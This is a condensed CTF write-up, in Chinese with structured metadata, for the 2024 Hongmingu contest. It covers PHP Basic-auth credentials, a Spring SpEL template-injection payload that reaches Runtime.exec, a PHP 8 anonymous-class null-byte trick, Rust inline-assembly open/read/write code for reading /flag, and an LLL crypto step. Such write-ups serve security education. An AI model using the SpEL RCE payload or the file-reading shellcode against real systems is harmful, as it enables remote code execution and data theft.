---
title: 2024 第四届红明谷 WriteUp By Mini-Venom（PHP 8 anonymous class + Spring SpEL + Rust 内联汇编）
contest: 2024 第四届红明谷
year: 2024
difficulty: medium
vuln_type: [rce, ssti, web_unknown, pwn_unknown]
tags: [红明谷 chips 线性变换 LLL, PHP Basic auth admin/2e525e29e465f45d8d7c56319fe73036, Spring SpEL T(java.lang.Boolean).forName, T(Runtime).getRuntime().exec('calc'), class@anonymous 0x00 截断, ezphpPhp8 路由, SpringTemplateEngine.process, Rust 内联汇编 sys_open+sys_read+sys_write ORW]
attack_chain:
  - PHP 鉴权: $_SERVER['PHP_AUTH_USER'] 校验 admin/2e525e29e465f45d8d7c56319fe73036
  - Spring SpEL: [[${T(java.lang.Boolean).forName("com.fasterxml.jackson.databind.ObjectMapper").newInstance().readValue("{}",...SpelExpressionParser).parseExpression("T(Runtime).getRuntime().exec('calc')").getValue()}]]
  - /flag.php?ezphpPhp8=ko1sh1 trigger highlight_file
  - class@anonymous\x00/var/www/html/flag.php:7$0 文件名截断 + dump 调试
  - Rust inline asm: sys_open("/flag\0", O_RDONLY) → sys_read(fd, buf) → sys_write(1, buf)
  - crypto chips 线性变换 → 对 S 求 LLL
key_payload: "Spring SpEL: T(Runtime).getRuntime().exec('calc')"
one_liner: 红明谷 Mini-Venom 综合：PHP Basic 鉴权 + Spring SpEL RCE + PHP 8 anonymous class 文件名 0x00 截断 + Rust 内联汇编 ORW + chips LLL。
lesson: Spring SpEL 注入通过 `[[${...}]]` 触发，`T(Class).forName` 反射调用是经典 payload；PHP 8 class@anonymous 0x00 截断是高版本 PHP 调试输出文件名的常用技巧；Rust core::arch::asm! 内联汇编做 ORW 是 2024 新趋势。
quality: high
---

# 2024 第四届红明谷 WriteUp By Mini-Venom

## Web 1: PHP Basic 鉴权
```php
$validUser = 'admin';
$validPass = '2e525e29e465f45d8d7c56319fe73036';
```
`WWW-Authenticate: Basic realm="Restricted Area"` + `$_SERVER['PHP_AUTH_USER']` 校验。

## Web 2: Spring SpEL
```java
Context context = new Context();
SpringTemplateEngine engine = new SpringTemplateEngine();
return engine.process(hostname, (IContext) context);
```
**SpEL payload**：
```
[[${T(java.lang.Boolean).forName("com.fasterxml.jackson.databind.ObjectMapper").newInstance()
   .readValue("{}", T(java.lang.Boolean).forName("org.springframework.expression.spel.standard.SpelExpressionParser"))
   .parseExpression("T(Runtime).getRuntime().exec('calc')").getValue()}]]
```
利用 `T(Class).forName` 反射拿 `Runtime.exec` 弹计算器。

## Web 3: PHP 8 anonymous class
```php
<?php
if (isset($_GET['ezphpPhp8'])) {
    highlight_file(__FILE__);
} else {
    die("No");
}
$a = new class { function __construct() {} };
```
GET `/flag.php?ezphpPhp8=ko1sh1` 触发 highlight，**`class@anonymous\x00/var/www/html/flag.php:7$0`** 0x00 截断 → dump 出 flag 文件。

## Pwn: Rust ORW
```rust
let mut buf = [0u8; 1024];
let filename = "/flag\0";
let fd: i32;
unsafe {
    core::arch::asm!(
        "syscall",
        in("rax") 2,         // sys_open
        in("rdi") filename.as_ptr(),
        in("rsi") 0,         // O_RDONLY
        lateout("rax") fd,
    );
    core::arch::asm!(
        "syscall",
        in("rax") 0,         // sys_read
        in("rdi") fd,
        in("rsi") buf.as_mut_ptr(),
    );
    core::arch::asm!(
        "syscall",
        in("rax") 1,         // sys_write
        in("rdi") 1,
        in("rsi") buf.as_ptr(),
    );
}
```
Rust `core::arch::asm!` 内联汇编做 ORW。

## Crypto: chips LLL
chips 矩阵元素 ∈ {1, -1}，对 chips 求 LLL 直接还原 S 矩阵（因为 S 是 chips 的线性变换）。
